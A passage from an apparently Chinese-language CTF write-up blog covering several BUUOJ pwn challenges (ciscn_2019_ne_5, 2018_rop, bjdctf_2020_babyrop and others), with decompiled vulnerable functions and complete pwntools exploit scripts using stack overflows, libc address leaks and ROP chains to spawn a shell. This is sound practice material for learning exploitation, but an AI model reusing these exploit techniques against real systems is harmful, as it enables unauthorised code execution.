</span></span><span class="line"><span class="cl">  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;3.Print all logs.&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;0.Exit</span><span class="se">\n</span><span class="s">:&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v4</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">switch</span> <span class="p">(</span> <span class="n">v4</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">case</span> <span class="mi">0</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">      <span class="nf">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">case</span> <span class="mi">1</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">      <span class="nf">AddLog</span><span class="p">(</span><span class="n">src</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="n">result</span> <span class="o">=</span> <span class="nf">sub_804892B</span><span class="p">(</span><span class="n">argc</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">case</span> <span class="mi">2</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">      <span class="nf">Display</span><span class="p">(</span><span class="n">src</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="n">result</span> <span class="o">=</span> <span class="nf">sub_804892B</span><span class="p">(</span><span class="n">argc</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">case</span> <span class="mi">3</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">      <span class="nf">Print</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">      <span class="n">result</span> <span class="o">=</span> <span class="nf">sub_804892B</span><span class="p">(</span><span class="n">argc</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">case</span> <span class="mi">4</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">      <span class="nf">GetFlag</span><span class="p">(</span><span class="n">src</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="n">result</span> <span class="o">=</span> <span class="nf">sub_804892B</span><span class="p">(</span><span class="n">argc</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">default</span><span class="o">:</span>
</span></span><span class="line"><span class="cl">      <span class="n">result</span> <span class="o">=</span> <span class="nf">sub_804892B</span><span class="p">(</span><span class="n">argc</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>先输入密码为administrator，然后进入菜单。</p>
<p>问题出在GetFlag里：</p>
<div class="highlight" id="id-9"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">GetFlag</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">src</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">dest</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span> <span class="c1">// [esp+0h] [ebp-48h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">v3</span><span class="p">[</span><span class="mi">60</span><span class="p">];</span> <span class="c1">// [esp+4h] [ebp-44h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">dest</span> <span class="o">=</span> <span class="mi">48</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nf">memset</span><span class="p">(</span><span class="n">v3</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">v3</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">  <span class="nf">strcpy</span><span class="p">(</span><span class="n">dest</span><span class="p">,</span> <span class="n">src</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;The flag is your log:%s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">dest</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>因为有fflush，其中的字符串sh可以代替/bin/sh</p>
<blockquote>
<p>ROPgadget  &ndash;binary ciscn_2019_ne_5  &ndash;string &ldquo;sh&rdquo;</p>
</blockquote>
<div class="highlight" id="id-10"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;DEBUG&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./ciscn_2019_ne_5&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./ciscn_2019_ne_5&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">##io = remote()</span>
</span></span><span class="line"><span class="cl"><span class="n">sh_addr</span> <span class="o">=</span> <span class="mh">0x080482ea</span>
</span></span><span class="line"><span class="cl"><span class="n">sys_addr</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x48</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span><span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">sys_addr</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">sh_addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;administrator&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;1&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;4&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></div><h3 id="0x14铁人三项第五赛区_2018_rop" class="heading-element">
  <a href="#0x14%e9%93%81%e4%ba%ba%e4%b8%89%e9%a1%b9%e7%ac%ac%e4%ba%94%e8%b5%9b%e5%8c%ba_2018_rop" class="heading-mark"></a>0x14.铁人三项(第五赛区)_2018_rop</h3><p>buf那里可以覆盖。</p>
<div class="highlight" id="id-11"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nf">be_nice_to_people</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="nf">vulnerable_function</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nf">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&#34;Hello, World</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="mh">0xDu</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kt">ssize_t</span> <span class="nf">vulnerable_function</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">136</span><span class="p">];</span> <span class="c1">// [esp+10h] [ebp-88h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x100u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>leak read或者write函数地址都OK。</p>
<div class="highlight" id="id-12"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="n">LibcSearcher</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;DEBUG&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">##io = process(&#34;./2018_rop&#34;)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node3.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">26602</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./2018_rop&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">write_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">read_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;read&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">main</span> <span class="o">=</span> <span class="mh">0x80484C6</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x88</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">write_plt</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">main</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">read_got</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">read_add</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">LibcSearcher</span><span class="p">(</span><span class="s1">&#39;read&#39;</span><span class="p">,</span><span class="n">read_add</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">base</span> <span class="o">=</span> <span class="n">read_add</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;read&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sys_add</span> <span class="o">=</span> <span class="n">base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;system&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">bin_sh</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s1">&#39;str_bin_sh&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x88</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">sys_add</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></div><h3 id="0x14others_shellcode" class="heading-element">
  <a href="#0x14others_shellcode" class="heading-mark"></a>0x14.others_shellcode</h3><p>就，，完全不知道这题想表达啥，可能就是想讲一下系统调用吧。</p>
<div class="highlight" id="id-13"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">00000550</span> <span class="nf">getShell</span>        <span class="no">proc</span> <span class="no">near</span>               <span class="c1">; CODE XREF: main+D↓p
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nl">.text:</span><span class="err">00000550</span> <span class="c1">; __unwind {
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nl">.text:</span><span class="err">00000550</span>                 <span class="nf">push</span>    <span class="no">ebp</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">00000551</span>                 <span class="nf">mov</span>     <span class="no">ebp</span><span class="p">,</span> <span class="no">esp</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">00000553</span>                 <span class="nf">call</span>    <span class="no">__x86_get_pc_thunk_ax</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">00000558</span>                 <span class="nf">add</span>     <span class="no">eax</span><span class="p">,</span> <span class="p">(</span><span class="no">offset</span> <span class="no">_GLOBAL_OFFSET_TABLE_</span> <span class="p">-</span> <span class="no">$</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">0000055</span><span class="nf">D</span>                 <span class="no">xor</span>     <span class="no">edx</span><span class="p">,</span> <span class="no">edx</span>        <span class="c1">; envp
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nl">.text:</span><span class="err">0000055</span><span class="nf">F</span>                 <span class="no">push</span>    <span class="no">edx</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">00000560</span>                 <span class="nf">push</span>    <span class="mi">68732</span><span class="no">F2Fh</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">00000565</span>                 <span class="nf">push</span>    <span class="mi">6</span><span class="no">E69622Fh</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">0000056</span><span class="nf">A</span>                 <span class="no">mov</span>     <span class="no">ebx</span><span class="p">,</span> <span class="no">esp</span>        <span class="c1">; file
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nl">.text:</span><span class="err">0000056</span><span class="nf">C</span>                 <span class="no">push</span>    <span class="no">edx</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">0000056</span><span class="nf">D</span>                 <span class="no">push</span>    <span class="no">ebx</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">0000056</span><span class="nf">E</span>                 <span class="no">mov</span>     <span class="no">ecx</span><span class="p">,</span> <span class="no">esp</span>        <span class="c1">; argv
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nl">.text:</span><span class="err">00000570</span>                 <span class="nf">mov</span>     <span class="no">eax</span><span class="p">,</span> <span class="mi">0</span><span class="no">FFFFFFFFh</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">00000575</span>                 <span class="nf">sub</span>     <span class="no">eax</span><span class="p">,</span> <span class="mi">0</span><span class="no">FFFFFFF4h</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">00000578</span>                 <span class="nf">int</span>     <span class="mi">80</span><span class="no">h</span>             <span class="c1">; LINUX - sys_execve
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nl">.text:</span><span class="err">0000057</span><span class="nf">A</span>                 <span class="no">nop</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">0000057</span><span class="nf">B</span>                 <span class="no">pop</span>     <span class="no">ebp</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">0000057</span><span class="nf">C</span>                 <span class="no">retn</span>
</span></span><span class="line"><span class="cl"><span class="nl">.text:</span><span class="err">0000057</span><span class="nf">C</span> <span class="err">;</span> <span class="err">}</span> <span class="err">//</span> <span class="no">starts</span> <span class="no">at</span> <span class="mi">550</span></span></span></code></pre></div><div class="highlight" id="id-14"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node3.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">27311</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></div><h3 id="0x15bjdctf_2020_babyrop" class="heading-element">
  <a href="#0x15bjdctf_2020_babyrop" class="heading-mark"></a>0x15.bjdctf_2020_babyrop</h3><p>一上来是两个puts，然后：</p>
<div class="highlight" id="id-15"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">ssize_t</span> <span class="nf">vuln</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span> <span class="c1">// [rsp+0h] [rbp-20h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Pull up your sword and tell me u story!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nf">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x64uLL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div><p>足够长，可以覆盖。</p>
<p>没有用LibcSearcher，一直说找不到，，，下了buu的libc好了。</p>
<div class="highlight" id="id-16"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;DEBUG&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node3.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">27222</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">##io = process(&#34;./bjdctf_2020_babyrop&#34;)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./bjdctf_2020_babyrop&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;libc-x64-2.23.so&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">puts_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">puts_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">main</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;main&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rdi_ret</span> <span class="o">=</span> <span class="mh">0x0000400733</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x20</span><span class="o">+</span><span class="mh">0x8</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">main</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">puts_add</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">base</span> <span class="o">=</span> <span class="n">puts_add</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">sys_add</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">bin_sh</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x20</span><span class="o">+</span><span class="mh">0x8</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span> <span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">sys_add</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></div><h3 id="0x16babyheap_0ctf_2017" class="heading-element">
  <a href="#0x16babyheap_0ctf_2017" class="heading-mark"></a>0x16.babyheap_0ctf_2017</h3><pre tabindex="0"><code>程序有4个功能：
Allocate：calloc分配内存，并给出相应的index
FIll：输入index，并分配内存，并填充
Free：释放输入index的内存
Dump：选择index并输出</code></pre><p>首先是Allocate：</p>
<div class="highlight" id="id-18"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">void</span> <span class="kr">__fastcall</span> <span class="nf">sub_D48</span><span class="p">(</span><span class="kr">__int64</span> <span class="n">a1</span><span class="p">){</span>  
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [rsp+10h] [rbp-10h]  
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">int</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// [rsp+14h] [rbp-Ch]  
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">void</span> <span class="o">*</span><span class="n">v3</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-8h]  
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">15</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>  
</span></span><span class="line"><span class="cl">    <span class="p">{</span>    
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span> <span class="o">!*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)(</span><span class="mi">24LL</span> <span class="o">*</span> <span class="n">i</span> <span class="o">+</span> <span class="n">a1</span><span class="p">)</span> <span class="p">)</span>    
</span></span><span class="line"><span class="cl">        <span class="p">{</span>      
</span></span><span class="line"><span class="cl">            <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Size: &#34;</span><span class="p">);</span>      
</span></span><span class="line"><span class="cl">            <span class="n">v2</span> <span class="o">=</span> <span class="nf">sub_138C</span><span class="p">();</span>      
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span> <span class="n">v2</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="p">)</span>      
</span></span><span class="line"><span class="cl">            <span class="p">{</span>        
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span> <span class="n">v2</span> <span class="o">&gt;</span> <span class="mi">4096</span> <span class="p">)</span>          
</span></span><span class="line"><span class="cl">                    <span class="n">v2</span> <span class="o">=</span> <span class="mi">4096</span><span class="p">;</span>        
</span></span><span class="line"><span class="cl">                <span class="n">v3</span> <span class="o">=</span> <span class="nf">calloc</span><span class="p">(</span><span class="n">v2</span><span class="p">,</span> <span class="mi">1uLL</span><span class="p">);</span>        
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">v3</span> <span class="p">)</span>          
</span></span><span class="line"><span class="cl">                    <span class="nf">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>        
